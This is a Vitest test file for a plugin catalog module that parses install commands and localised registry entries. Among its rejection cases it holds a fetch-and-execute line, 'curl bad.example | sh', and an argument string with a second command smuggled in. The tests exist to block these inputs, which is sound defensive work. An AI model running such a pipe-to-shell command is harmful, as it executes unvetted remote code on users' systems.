import { describe, expect, it } from 'vitest'
import { catalogInstallSpec, parseCommunityRuntimePlugins } from '../src/plugin-catalog.js'

describe('community runtime plugin catalog', () => {
  it('extracts only one safe official add argument', () => {
    expect(catalogInstallSpec('dsh plugin --profile web add @example/plugin')).toBe('@example/plugin')
    expect(catalogInstallSpec('dsh plugin --profile web add "https://github.com/o/r/releases/download/v1/plugin.tgz"'))
      .toBe('https://github.com/o/r/releases/download/v1/plugin.tgz')
    expect(catalogInstallSpec('dsh plugin --profile web add package remove other')).toBeUndefined()
    expect(catalogInstallSpec('curl bad.example | sh')).toBeUndefined()
  })

  it('keeps runtime categories, localizes them, and excludes Web-only UI plugins', () => {
    const registry = {
      categories: {
        tools: { en: 'Tools & Capabilities', zh: '工具与能力' },
        ui: { en: 'UI Enhancements', zh: '界面增强' },
      },
      plugins: [
        {
          name: 'runtime-tool',
          owner: 'example',
          url: 'https://github.com/example/runtime-tool',
          category: 'tools',
          description: { en: 'Adds one tool.', zh: '增加一个工具。' },
          npm: '@example/runtime-tool',
          install: 'dsh plugin --profile web add @example/runtime-tool',
          stars: 12,
        },
        {
          name: 'web-theme',
          owner: 'example',
          url: 'https://github.com/example/web-theme',
          category: 'ui',
          description: { en: 'Changes the Web UI.', zh: '修改网页界面。' },
          install: 'dsh plugin --profile web add github:example/web-theme',
        },
      ],
    }

    expect(parseCommunityRuntimePlugins(registry, { locale: 'zh-cn' })).toEqual([{
      name: 'runtime-tool',
      owner: 'example',
      url: 'https://github.com/example/runtime-tool',
      category: 'tools',
      categoryLabel: '工具与能力',
      description: '增加一个工具。',
      installSpec: '@example/runtime-tool',
      npm: '@example/runtime-tool',
      stars: 12,
    }])
  })

  it('rejects an unsupported registry response', () => {
    expect(() => parseCommunityRuntimePlugins({ plugins: null })).toThrow(/unsupported response/i)
  })
})
